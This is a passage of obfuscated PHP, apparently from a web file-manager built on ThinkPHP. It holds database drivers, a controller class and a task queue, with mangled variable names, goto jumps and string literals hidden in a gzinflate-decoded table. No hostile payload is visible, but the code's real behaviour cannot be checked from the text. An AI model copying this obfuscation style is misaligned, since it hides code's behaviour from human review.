= $¬×ÌõŸƒ[950] . ($this->dbType == $¬×ÌõŸƒ[949] ? "\x60{$ç©³”Ğ}\x60" : $ç©³”Ğ); } } $ó­Œ¡Ç¶ = $this->query($ò‘¸ı¡Ş); $ –¦‚¸ˆ = array(); if ($ó­Œ¡Ç¶) { foreach ($ó­Œ¡Ç¶ as $ü‚ïöíÃ => $·§Ï’îÅ) { $·§Ï’îÅ = array_change_key_case($·§Ï’îÅ); $·§Ï’îÅ[$¬×ÌõŸƒ[32]] = isset($·§Ï’îÅ[$¬×ÌõŸƒ[32]]) ? $·§Ï’îÅ[$¬×ÌõŸƒ[32]] : $¬×ÌõŸƒ[378]; $·§Ï’îÅ[$¬×ÌõŸƒ[33]] = isset($·§Ï’îÅ[$¬×ÌõŸƒ[33]]) ? $·§Ï’îÅ[$¬×ÌõŸƒ[33]] : $¬×ÌõŸƒ[378]; $½—¤Ç¢¶ = isset($·§Ï’îÅ[$¬×ÌõŸƒ[273]]) ? $·§Ï’îÅ[$¬×ÌõŸƒ[273]] : $·§Ï’îÅ[$¬×ÌõŸƒ[32]]; $ –¦‚¸ˆ[$½—¤Ç¢¶] = array($¬×ÌõŸƒ[32] => $½—¤Ç¢¶, $¬×ÌõŸƒ[33] => $·§Ï’îÅ[$¬×ÌõŸƒ[33]], $¬×ÌõŸƒ[35] => (bool) (isset($·§Ï’îÅ[$¬×ÌõŸƒ[103]]) && $·§Ï’îÅ[$¬×ÌõŸƒ[103]] === $¬×ÌõŸƒ[12] || isset($·§Ï’îÅ[$¬×ÌõŸƒ[35]]) && $·§Ï’îÅ[$¬×ÌõŸƒ[35]] === $¬×ÌõŸƒ[12]), $¬×ÌõŸƒ[37] => isset($·§Ï’îÅ[$¬×ÌõŸƒ[37]]) ? $·§Ï’îÅ[$¬×ÌõŸƒ[37]] : (isset($·§Ï’îÅ[$¬×ÌõŸƒ[56]]) ? $·§Ï’îÅ[$¬×ÌõŸƒ[56]] : $¬×ÌõŸƒ[378]), $¬×ÌõŸƒ[39] => isset($·§Ï’îÅ[$¬×ÌõŸƒ[94]]) ? strtolower($·§Ï’îÅ[$¬×ÌõŸƒ[94]]) == $¬×ÌõŸƒ[41] : (isset($·§Ï’îÅ[$¬×ÌõŸƒ[57]]) ? $·§Ï’îÅ[$¬×ÌõŸƒ[57]] : !1), $¬×ÌõŸƒ[42] => isset($·§Ï’îÅ[$¬×ÌõŸƒ[951]]) ? strtolower($·§Ï’îÅ[$¬×ÌõŸƒ[951]]) == $¬×ÌõŸƒ[44] : (isset($·§Ï’îÅ[$¬×ÌõŸƒ[94]]) ? $·§Ï’îÅ[$¬×ÌõŸƒ[94]] : !1)); } } return $ –¦‚¸ˆ; } public function getTables($çè¹Šö¬ = '') { $§ùºúÔ =& $_SERVER[Îûáû“ş]; if (think_config($§ùºúÔ[952])) { $å»£Ò•¡ = str_replace($§ùºúÔ[953], $çè¹Šö¬, think_config($§ùºúÔ[952])); } else { switch ($this->dbType) { case $§ùºúÔ[920]: case $§ùºúÔ[922]: $å»£Ò•¡ = $§ùºúÔ[954]; break; case $§ùºúÔ[919]: case $§ùºúÔ[937]: $å»£Ò•¡ = $§ùºúÔ[955]; break; case $§ùºúÔ[946]: $å»£Ò•¡ = $§ùºúÔ[956]; break; case $§ùºúÔ[921]: think_exception(think_lang($§ùºúÔ[957]) . $§ùºúÔ[958]); break; case $§ùºúÔ[938]: $å»£Ò•¡ = $§ùºúÔ[45] . $§ùºúÔ[46] . $§ùºúÔ[47]; break; case $§ùºúÔ[949]: default: if (!empty($çè¹Šö¬)) { $å»£Ò•¡ = $§ùºúÔ[901] . $çè¹Šö¬ . $§ùºúÔ[902]; } else { $å»£Ò•¡ = $§ùºúÔ[903]; } } } $Ïî’èò€ = $this->query($å»£Ò•¡); $“ú‚Éƒ = array(); foreach ($Ïî’èò€ as $¯© Ã => $¸”ŞÒ½) { $“ú‚Éƒ[$¯© Ã] = current($¸”ŞÒ½); } return $“ú‚Éƒ; } protected function parseLimit($÷Ş‰úÒ¥) { $•‹ÃÄïî =& $_SERVER[Îûáû“ş]; $ŒáŞÈã— = $•‹ÃÄïî[12]; if (!empty($÷Ş‰úÒ¥)) { switch ($this->dbType) { case $•‹ÃÄïî[946]: case $•‹ÃÄïî[938]: $÷Ş‰úÒ¥ = explode($•‹ÃÄïî[50], $÷Ş‰úÒ¥); if (count($÷Ş‰úÒ¥) > 1) { $ŒáŞÈã— .= $•‹ÃÄïî[51] . $÷Ş‰úÒ¥[1] . $•‹ÃÄïî[52] . $÷Ş‰úÒ¥[0] . $•‹ÃÄïî[53]; } else { $ŒáŞÈã— .= $•‹ÃÄïî[51] . $÷Ş‰úÒ¥[0] . $•‹ÃÄïî[53]; } break; case $•‹ÃÄïî[919]: case $•‹ÃÄïî[937]: break; case $•‹ÃÄïî[921]: break; case $•‹ÃÄïî[920]: case $•‹ÃÄïî[922]: break; case $•‹ÃÄïî[949]: default: $ŒáŞÈã— .= $•‹ÃÄïî[51] . $÷Ş‰úÒ¥ . $•‹ÃÄïî[53]; } } return $ŒáŞÈã—; } public function parseKey(&$ë©Ñ‚Ìå, $”ÉØ‰Ø¬ = true) { $¤£á«òŠ =& $_SERVER[Îûáû“ş]; if ($”ÉØ‰Ø¬) { $ë©Ñ‚Ìå = $this->parseKeyCheck($ë©Ñ‚Ìå); } if ($this->dbType == $¤£á«òŠ[949]) { if ($ë©Ñ‚Ìå != $¤£á«òŠ[189] && !preg_match($¤£á«òŠ[913], $ë©Ñ‚Ìå)) { $ë©Ñ‚Ìå = $¤£á«òŠ[385] . trim($ë©Ñ‚Ìå, $¤£á«òŠ[385]) . $¤£á«òŠ[385]; } return $ë©Ñ‚Ìå; } else { return parent::parseKey($ë©Ñ‚Ìå, $”ÉØ‰Ø¬); } } public function close() { $this->_linkID = null; } public function error() { $êşŠ§È“ =& $_SERVER[Îûáû“ş]; if ($this->PDOStatement) { $¿Ñ¹†Ÿ = $this->PDOStatement->errorInfo(); $this->error = $¿Ñ¹†Ÿ[1] . $êşŠ§È“[4] . $¿Ñ¹†Ÿ[2]; } else { $this->error = $êşŠ§È“[12]; } if ($êşŠ§È“[12] != $this->queryStr) { $this->error .= LNG($êşŠ§È“[48]) . $this->queryStr; } think_trace($this->error, $êşŠ§È“[12], $êşŠ§È“[49]); return $this->error; } public function escapeString($î®Ì©››) { $°àŞ¸˜— =& $_SERVER[Îûáû“ş]; switch ($this->dbType) { case $°àŞ¸˜—[946]: case $°àŞ¸˜—[919]: case $°àŞ¸˜—[937]: case $°àŞ¸˜—[949]: return addslashes($î®Ì©››); case $°àŞ¸˜—[921]: case $°àŞ¸˜—[938]: case $°àŞ¸˜—[920]: case $°àŞ¸˜—[922]: return str_ireplace($°àŞ¸˜—[58], $°àŞ¸˜—[59], $î®Ì©››); } } protected function parseValue($ôÖúÊ¶Ã) { $«¥üøúÉ =& $_SERVER[Îûáû“ş]; if (is_string($ôÖúÊ¶Ã)) { $Çë³Â¬ù = strpos($ôÖúÊ¶Ã, $«¥üøúÉ[4]) === 0 && in_array($ôÖúÊ¶Ã, array_keys($this->bind)); $ôÖúÊ¶Ã = $Çë³Â¬ù ? $this->escapeString($ôÖúÊ¶Ã) : $«¥üøúÉ[959] . $this->escapeString($ôÖúÊ¶Ã) . $«¥üøúÉ[959]; } elseif (isset($ôÖúÊ¶Ã[0]) && is_string($ôÖúÊ¶Ã[0]) && strtolower($ôÖúÊ¶Ã[0]) == $«¥üøúÉ[297]) { $ôÖúÊ¶Ã = $this->escapeString($ôÖúÊ¶Ã[1]); } elseif (is_array($ôÖúÊ¶Ã)) { $ôÖúÊ¶Ã = array_map(array($this, $«¥üøúÉ[960]), $ôÖúÊ¶Ã); } elseif (is_bool($ôÖúÊ¶Ã)) { $ôÖúÊ¶Ã = $ôÖúÊ¶Ã ? $«¥üøúÉ[88] : $«¥üøúÉ[198]; } elseif (is_null($ôÖúÊ¶Ã)) { $ôÖúÊ¶Ã = $«¥üøúÉ[103]; } return $ôÖúÊ¶Ã; } public function getLastInsertId() { $ˆÕ·º• =& $_SERVER[Îûáû“ş]; switch ($this->dbType) { case $ˆÕ·º•[946]: case $ˆÕ·º•[938]: case $ˆÕ·º•[919]: case $ˆÕ·º•[937]: case $ˆÕ·º•[921]: case $ˆÕ·º•[949]: return $this->_linkID->lastInsertId(); case $ˆÕ·º•[920]: case $ˆÕ·º•[922]: $íıóœŒª = $this->table; $ÄÏ˜Ú™¢ = $this->query("\123\105\114\x45\x43\124\40{$íıóœŒª}\56\x63\x75\x72\162\x76\x61\x6c\x20\x63\165\x72\x72\166\141\x6c\x20\x46\x52\117\x4d\x20\x64\165\141\154"); return $ÄÏ˜Ú™¢ ? $ÄÏ˜Ú™¢[0][$ˆÕ·º•[961]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($İôÊšÏÎ) { $Şìã—ğ =& $_SERVER[Îûáû“ş]; if (!CacheLock::fileLock($Şìã—ğ[13])) { return !1; } $·ÆÎÚí = parent::query($İôÊšÏÎ); CacheLock::fileUnLock($Şìã—ğ[13]); return $·ÆÎÚí; } public function execute($ÏÊ¹º’Õ) { $åø¨¹Ş =& $_SERVER[Îûáû“ş]; if (!CacheLock::fileLock($åø¨¹Ş[13])) { return !1; } $ÈÎµ¿å÷ = parent::execute($ÏÊ¹º’Õ); CacheLock::fileUnLock($åø¨¹Ş[13]); return $ÈÎµ¿å÷; } } class DbSqlite3 extends DbSqlite3Base { public function query($×óü¹ãş) { $»¬Íå€ =& $_SERVER[Îûáû“ş]; if (!CacheLock::fileLock($»¬Íå€[13])) { return !1; } $ÕÂ—Ã›ë = parent::query($×óü¹ãş); CacheLock::fileUnLock($»¬Íå€[13]); return $ÕÂ—Ã›ë; } public function execute($şúÌÀ¹ü) { $»³½ªæ =& $_SERVER[Îûáû“ş]; if (!CacheLock::fileLock($»³½ªæ[13])) { return !1; } $š©ßÕœ£ = parent::execute($şúÌÀ¹ü); CacheLock::fileUnLock($»³½ªæ[13]); return $š©ßÕœ£; } } goto fÀ´Ç½‚ë; DĞ‚¹õŠÄ½: define($_SERVER[Îûáû“ş][241], 1); define($_SERVER[Îûáû“ş][242], 0); define($_SERVER[Îûáû“ş][243], 2); goto cÊ·æ‚†’; E‘Õ®«ï: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $…ûàİ™ =& $_SERVER[Îûáû“ş]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$…ûàİ™[6]] =& $config; $this->values[$…ûàİ™[7]] =& $in; $this->tpl = TEMPLATE . MOD . $…ûàİ™[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ŞüŞó÷) { if (1 === func_num_args()) { $this->{$ŞüŞó÷} = new $ŞüŞó÷(); } else { $£Ê‚Èßù = new ReflectionClass($ŞüŞó÷); $«èã‰”¾ = func_get_args(); array_shift($«èã‰”¾); $this->{$ŞüŞó÷} = $£Ê‚Èßù->newInstanceArgs($«èã‰”¾); } return $this->{$ŞüŞó÷}; } public function routeBind($¹´ÇÀˆÒ, $º¹‘€®Ÿ, $Ü¢Êøå® = 3) { $¯¹´Èƒı =& $_SERVER[Îûáû“ş]; $úúø§´‹ = $this->in[$¯¹´Èƒı[9]]; $¹´ÇÀˆÒ = str_replace($¯¹´Èƒı[10], $¯¹´Èƒı[11], trim(trim($¹´ÇÀˆÒ, $¯¹´Èƒı[8]), $¯¹´Èƒı[12])); if (!$¹´ÇÀˆÒ || count($úúø§´‹) <= $Ü¢Êøå®) { return !1; } $³À¿Å÷İ = !0; $ĞÄ˜‚­‘ = explode($¯¹´Èƒı[8], $¹´ÇÀˆÒ); for ($Ì‰©Ï”ã = 0; $Ì‰©Ï”ã < count($ĞÄ˜‚­‘); $Ì‰©Ï”ã++) { if ($ĞÄ˜‚­‘[$Ì‰©Ï”ã] != $úúø§´‹[$Ü¢Êøå® + $Ì‰©Ï”ã]) { $³À¿Å÷İ = !1; break; } } if (!$³À¿Å÷İ) { return; } call_user_func_array(array($this, $º¹‘€®Ÿ), array()); } public function routeArgs($êÍ­÷ƒ‘ = 3) { $ĞŸ…ñ›Ò = $this->in[$_SERVER[Îûáû“ş][9]]; if (count($ĞŸ…ñ›Ò) <= $êÍ­÷ƒ‘) { return array(); } $¼ºöáã€ = array(); for ($˜şºè™Ù = $êÍ­÷ƒ‘; $˜şºè™Ù < count($ĞŸ…ñ›Ò); $˜şºè™Ù += 2) { $¼ºöáã€[$ĞŸ…ñ›Ò[$˜şºè™Ù]] = $ĞŸ…ñ›Ò[$˜şºè™Ù + 1]; $this->in[$ĞŸ…ñ›Ò[$˜şºè™Ù]] = $ĞŸ…ñ›Ò[$˜şºè™Ù + 1]; } return $¼ºöáã€; } protected function assign($À›Œõ³Ê, $€§Í¦¬) { $this->values[$À›Œõ³Ê] = $€§Í¦¬; } protected function display($á…™Â–²) { ob_end_clean(); extract($this->values); require $this->tpl . $á…™Â–²; } } class DbSqliteBase extends Db { public function __construct($Ö†àª¿ = '') { $Õ¤íæÒØ =& $_SERVER[Îûáû“ş]; if (!extension_loaded($Õ¤íæÒØ[13])) { think_exception(think_lang($Õ¤íæÒØ[14]) . $Õ¤íæÒØ[15]); } if (!empty($Ö†àª¿)) { if (!isset($Ö†àª¿[$Õ¤íæÒØ[16]])) { $Ö†àª¿[$Õ¤íæÒØ[16]] = 438; } $this->config = $Ö†àª¿; if (empty($this->config[$Õ¤íæÒØ[17]])) { $this->config[$Õ¤íæÒØ[17]] = array(); } } } public function connect($ì‘†ÅÊ× = '', $†ƒíºğæ = 0) { $›Àæ Ù¿ =& $_SERVER[Îûáû“ş]; if (!isset($this->linkID[$†ƒíºğæ])) { if (empty($ì‘†ÅÊ×)) { $ì‘†ÅÊ× = $this->config; } $şŸÌÉÊÜ = !empty($ì‘†ÅÊ×[$›Àæ Ù¿[17]][$›Àæ Ù¿[18]]) ? $ì‘†ÅÊ×[$›Àæ Ù¿[17]][$›Àæ Ù¿[18]] : $this->pconnect; $Ôò©†À = $şŸÌÉÊÜ ? $›Àæ Ù¿[19] : $›Àæ Ù¿[20]; $this->linkID[$†ƒíºğæ] = $Ôò©†À($ì‘†ÅÊ×[$›Àæ Ù¿[21]], $ì‘†ÅÊ×[$›Àæ Ù¿[16]]); if (!$this->linkID[$†ƒíºğæ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$†ƒíºğæ], 30000); if (1 != think_config($›Àæ Ù¿[22])) { unset($this->config); } } return $this->linkID[$†ƒíºğæ]; } public function free() { $this->queryID = null; } public function query($“Äœİ°ï) { $«çÏìŠß =& $_SERVER[Îûáû“ş]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $“Äœİ°ï; if ($this->queryID) { $this->free(); } think_action_status($«çÏìŠß[23], 1); think_status($«çÏìŠß[24]); $this->queryID = sqlite_query($this->_linkID, $“Äœİ°ï); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $¥·ôÈ¹Ê = $this->getAll(); return $¥·ôÈ¹Ê; } } public function execute($ô¾ø‰Ú±) { $êÃ¯©êÜ =& $_SERVER[Îûáû“ş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ô¾ø‰Ú±; if ($this->queryID) { $this->free(); } think_action_status($êÃ¯©êÜ[25], 1); think_status($êÃ¯©êÜ[24]); $ƒÖñ»¢È = sqlite_exec($this->_linkID, $ô¾ø‰Ú±); $this->debug(); if (!1 === $ƒÖñ»¢È) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Îûáû“ş][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $«à¿«ıÔ = sqlite_query($this->_linkID, $_SERVER[Îûáû“ş][27]); if (!$«à¿«ıÔ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $‘‚Ÿï÷ = sqlite_query($this->_linkID, $_SERVER[Îûáû“ş][28]); if (!$‘‚Ÿï÷) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $­ò™Áâ = array(); if ($this->numRows > 0) { for ($‰æ•µ• = 0; $‰æ•µ• < $this->numRows; $‰æ•µ•++) { $­ò™Áâ[$‰æ•µ•] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $­ò™Áâ; } public function getFields($ä…à‘ô’) { $ğºåÆ˜Â =& $_SERVER[Îûáû“ş]; $•î¤ã¡› = $this->query($ğºåÆ˜Â[29] . $ä…à‘ô’ . $ğºåÆ˜Â[30]); $Ÿ—Ö¦ = array(); if ($•î¤ã¡›) { foreach ($•î¤ã¡› as $€¢Ú«Øš => $½ÂÕØ¡) { $Ÿ—Ö¦[$½ÂÕØ¡[$ğºåÆ˜Â[31]]] = array($ğºåÆ˜Â[32] => $½ÂÕØ¡[$ğºåÆ˜Â[31]], $ğºåÆ˜Â[33] => $½ÂÕØ¡[$ğºåÆ˜Â[34]], $ğºåÆ˜Â[35] => (bool) ($½ÂÕØ¡[$ğºåÆ˜Â[36]] === $ğºåÆ˜Â[12]), $ğºåÆ˜Â[37] => $½ÂÕØ¡[$ğºåÆ˜Â[38]], $ğºåÆ˜Â[39] => strtolower($½ÂÕØ¡[$ğºåÆ˜Â[40]]) == $ğºåÆ˜Â[41], $ğºåÆ˜Â[42] => strtolower($½ÂÕØ¡[$ğºåÆ˜Â[43]]) == $ğºåÆ˜Â[44]); } } return $Ÿ—Ö¦; } public function getTables($ÑïÜñª = '') { $§õúã¼¡ =& $_SERVER[Îûáû“ş]; $¥Ä»·ñ = $this->query($§õúã¼¡[45] . $§õúã¼¡[46] . $§õúã¼¡[47]); $ Ì·³°• = array(); foreach ($¥Ä»·ñ as $†£¯Ğš³ => $“£÷â¯) { $ Ì·³°•[$†£¯Ğš³] = current($“£÷â¯); } return $ Ì·³°•; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $§ŸÅà¬™ =& $_SERVER[Îûáû“ş]; $Ìûñ°‡ = sqlite_last_error($this->_linkID); $this->error = $Ìûñ°‡ . $§ŸÅà¬™[4] . sqlite_error_string($Ìûñ°‡); if ($§ŸÅà¬™[12] != $this->queryStr) { $this->error .= LNG($§ŸÅà¬™[48]) . $this->queryStr; } think_trace($this->error, $§ŸÅà¬™[12], $§ŸÅà¬™[49]); return $this->error; } public function escapeString($ş•şƒ­Ğ) { return sqlite_escape_string($ş•şƒ­Ğ); } public function parseLimit($‹ÍÂ¢ùİ) { $÷“§ÈâÌ =& $_SERVER[Îûáû“ş]; $œ¤ğÅä¨ = $÷“§ÈâÌ[12]; if (!empty($‹ÍÂ¢ùİ)) { $‹ÍÂ¢ùİ = explode($÷“§ÈâÌ[50], $‹ÍÂ¢ùİ); if (count($‹ÍÂ¢ùİ) > 1) { $œ¤ğÅä¨ .= $÷“§ÈâÌ[51] . $‹ÍÂ¢ùİ[1] . $÷“§ÈâÌ[52] . $‹ÍÂ¢ùİ[0] . $÷“§ÈâÌ[53]; } else { $œ¤ğÅä¨ .= $÷“§ÈâÌ[51] . $‹ÍÂ¢ùİ[0] . $÷“§ÈâÌ[53]; } } return $œ¤ğÅä¨; } } class DbSqlite3Base extends Db { public function __construct($ó‹ÈÓõ— = '') { $åÏ»…€ö =& $_SERVER[Îûáû“ş]; if (!class_exists($åÏ»…€ö[54])) { think_exception(think_lang($åÏ»…€ö[14]) . $åÏ»…€ö[55]); } if (!empty($ó‹ÈÓõ—)) { if (!isset($ó‹ÈÓõ—[$åÏ»…€ö[16]])) { $ó‹ÈÓõ—[$åÏ»…€ö[16]] = 438; } $this->config = $ó‹ÈÓõ—; if (empty($this->config[$åÏ»…€ö[17]])) { $this->config[$åÏ»…€ö[17]] = array(); } } } public function connect($¬Ğ—™áÀ = '', $Ù§˜¦ÙÏ = 0) { $Ú¶ˆæ¯ß =& $_SERVER[Îûáû“ş]; if (!isset($this->linkID[$Ù§˜¦ÙÏ])) { if (empty($¬Ğ—™áÀ)) { $¬Ğ—™áÀ = $this->config; } $this->linkID[$Ù§˜¦ÙÏ] = new SQLite3($¬Ğ—™áÀ[$Ú¶ˆæ¯ß[21]]); if (!$this->linkID[$Ù§˜¦ÙÏ]) { think_exception($this->linkID[$Ù§˜¦ÙÏ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Ù§˜¦ÙÏ]->busyTimeout(30000); if (1 != think_config($Ú¶ˆæ¯ß[22])) { unset($this->config); } } return $this->linkID[$Ù§˜¦ÙÏ]; } public function free() { $this->queryID = null; } public function query($—Û¯—£ã) { $³ÅŸıÎ =& $_SERVER[Îûáû“ş]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $—Û¯—£ã; if ($this->queryID) { $this->free(); } think_action_status($³ÅŸıÎ[23], 1); think_status($³ÅŸıÎ[24]); $this->queryID = $this->_linkID->query($—Û¯—£ã); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $±Ìô¼á¢ = $this->getAll(); $this->numRows = count($±Ìô¼á¢); return $±Ìô¼á¢; } } public function execute($ßÄ…¨£Ù) { $¥æóÎ²– =& $_SERVER[Îûáû“ş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ßÄ…¨£Ù; if ($this->queryID) { $this->free(); } think_action_status($¥æóÎ²–[25], 1); think_status($¥æóÎ²–[24]); $£ÔÀ™‹ú = $this->_linkID->exec($ßÄ…¨£Ù); $this->debug(); if (!1 === $£ÔÀ™‹ú) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Îûáû“ş][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $çöàùÕŸ = $this->_linkID->query($_SERVER[Îûáû“ş][27]); if (!$çöàùÕŸ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Õâ„®ÆŸ = $this->_linkID->query($_SERVER[Îûáû“ş][28]); if (!$Õâ„®ÆŸ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ô°¡¬şå = array(); while ($–¶á“©£ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ô°¡¬şå[] = $–¶á“©£; } $this->queryID->reset(); return $ô°¡¬şå; } public function getFields($Šœª±¨Ö) { $áÊøÂÛ¨ =& $_SERVER[Îûáû“ş]; $öÂÃæÑÌ = $this->query($áÊøÂÛ¨[29] . $Šœª±¨Ö . $áÊøÂÛ¨[30]); $‹€ÀÈˆË = array(); if ($öÂÃæÑÌ) { foreach ($öÂÃæÑÌ as $°”ôõöÄ => $ò‚°Ò’—) { $‹€ÀÈˆË[$ò‚°Ò’—[$áÊøÂÛ¨[32]]] = array($áÊøÂÛ¨[32] => $ò‚°Ò’—[$áÊøÂÛ¨[32]], $áÊøÂÛ¨[33] => $ò‚°Ò’—[$áÊøÂÛ¨[33]], $áÊøÂÛ¨[35] => (bool) ($ò‚°Ò’—[$áÊøÂÛ¨[35]] === $áÊøÂÛ¨[12]), $áÊøÂÛ¨[37] => $ò‚°Ò’—[$áÊøÂÛ¨[56]], $áÊøÂÛ¨[39] => (bool) $ò‚°Ò’—[$áÊøÂÛ¨[57]], $áÊøÂÛ¨[42] => (bool) $ò‚°Ò’—[$áÊøÂÛ¨[57]]); } } return $‹€ÀÈˆË; } public function getTables($ß÷ÛÖº = '') { $ö›¯Ùüš =& $_SERVER[Îûáû“ş]; $Åßëğ¸ = $this->query($ö›¯Ùüš[45] . $ö›¯Ùüš[46] . $ö›¯Ùüš[47]); $ûÙ‰‰Ì½ = array(); foreach ($Åßëğ¸ as $ó®«Ìùï => $œ®¨²§») { $ûÙ‰‰Ì½[$ó®«Ìùï] = current($œ®¨²§»); } return $ûÙ‰‰Ì½; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $“ª×ä¬° =& $_SERVER[Îûáû“ş]; $this->error = $this->_linkID->lastErrorMsg(); if ($“ª×ä¬°[12] != $this->queryStr) { $this->error .= LNG($“ª×ä¬°[48]) . $this->queryStr; } think_trace($this->error, $“ª×ä¬°[12], $“ª×ä¬°[49]); return $this->error; } public function escapeString($šá¦üŸú) { $®ù­Í¢À =& $_SERVER[Îûáû“ş]; if ($this->_linkID) { return $this->_linkID->escapeString($šá¦üŸú); } return str_ireplace($®ù­Í¢À[58], $®ù­Í¢À[59], $šá¦üŸú); } public function parseLimit($ÍèæŒ½ş) { $üõ°ê”ï =& $_SERVER[Îûáû“ş]; $Ö¹ »ª¡ = $üõ°ê”ï[12]; if (!empty($ÍèæŒ½ş)) { $ÍèæŒ½ş = explode($üõ°ê”ï[50], $ÍèæŒ½ş); if (count($ÍèæŒ½ş) > 1) { $Ö¹ »ª¡ .= $üõ°ê”ï[51] . $ÍèæŒ½ş[1] . $üõ°ê”ï[52] . $ÍèæŒ½ş[0] . $üõ°ê”ï[53]; } else { $Ö¹ »ª¡ .= $üõ°ê”ï[51] . $ÍèæŒ½ş[0] . $üõ°ê”ï[53]; } } return $Ö¹ »ª¡; } } goto e‹®ºâ·Îä; FºÀ…Êùğ: define($_SERVER[Îûáû“ş][0], $_SERVER[Îûáû“ş][1]); $_SERVER[Ä­ñÛ£Ä] = explode($_SERVER[Îûáû“ş][2], gzinflate(substr($_SERVER[Îûáû“ş][3], 10, -8))); function binCheckEq($ÔôÆª®, $ÓïÊçµ) { return $ÔôÆª® == $ÓïÊçµ; } goto cºÄÖÔ¥—Ê; få«‘ï¶ˆ: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\x73\153\x51\165\145\x75\145\114\145\156\x67\x74\x68"; const QUEUE_DATA = "\164\x61\163\153\121\x75\145\x75\x65\x44\x61\x74\141"; public static $listData = false; public static function initTask() { } public static function add($ÅÒÑÂ§ñ, $ÒÑÓø = array(), $ñ§ñâË = '', $Èä×ìšó = '') { $Å¸­›÷µ =& $_SERVER[Îûáû“ş]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Èä×ìšó && array_find_by_field(self::$listData, $Å¸­›÷µ[94], $Èä×ìšó)) { return !0; } self::$listData[] = array($Å¸­›÷µ[264] => $ÅÒÑÂ§ñ, $Å¸­›÷µ[1768] => $ÒÑÓø, $Å¸­›÷µ[453] => $ñ§ñâË, $Å¸­›÷µ[94] => $Èä×ìšó); return !0; } public static function addSubmit() { $ §ë¯ºø =& $_SERVER[Îûáû“ş]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($ §ë¯ºø[1769] . json_encode_force(array_to_keyvalue(self::$listData, $ §ë¯ºø[12], $ §ë¯ºø[453])), $ §ë¯ºø[1770]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($ÏªÈ­¬ˆ, $¤ò½½âç = array(), $ô‘±ò˜ = '', $™éà™ºÏ = '') { $Õû‰íÙû =& $_SERVER[Îûáû“ş]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ãòÛç° = self::getAll(); if ($™éà™ºÏ && array_find_by_field($ãòÛç°, $Õû‰íÙû[94], $™éà™ºÏ)) { return !0; } $ãòÛç°[] = array($Õû‰íÙû[264] => $ÏªÈ­¬ˆ, $Õû‰íÙû[1768] => $¤ò½½âç, $Õû‰íÙû[453] => $ô‘±ò˜, $Õû‰íÙû[94] => $™éà™ºÏ); write_log($Õû‰íÙû[1769] . $ô‘±ò˜, $Õû‰íÙû[1770]); self::setAll($ãòÛç°); return !0; } public static function run() { $½©•à²¦ =& $_SERVER[Îûáû“ş]; $œĞ•¬µî = self::getAll(); $îÖÚš×Ù = array_shift($œĞ•¬µî); if (!$îÖÚš×Ù) { return !1; } self::setAll($œĞ•¬µî); $Şâêß‹Ï = timeFloat(); try { Hook::apply($îÖÚš×Ù[$½©•à²¦[264]], $îÖÚš×Ù[$½©•à²¦[1768]]); } catch (Exception $Ë“í—•) { } $œÂ•ŒÃ¨ = number_format(timeFloat() - $Şâêß‹Ï, 3) . $½©•à²¦[1686]; write_log($½©•à²¦[1771] . $îÖÚš×Ù[$½©•à²¦[453]] . $½©•à²¦[1772] . $œÂ•ŒÃ¨, $½©•à²¦[1770]); return !0; } public static function count() { $à½¤éÅ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$à½¤éÅ) { return 0; } return intval($à½¤éÅ); } public static function getAll() { $İ¢¤ƒ“¯ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$İ¢¤ƒ“¯) { return array(); } return $İ¢¤ƒ“¯; } public static function setAll($ú‹âéË) { $‘ñØÒ È = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ú‹âéË), $‘ñØÒ È); Cache::set(self::QUEUE_DATA, $ú‹âéË, $‘ñØÒ È); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ı¡ëåÛŠ, $À´íëÍÆ = 5.0) { if (!$ı¡ëåÛŠ) { return; } $±•ñ±±Ò = Cache::get($ı¡ëåÛŠ); if 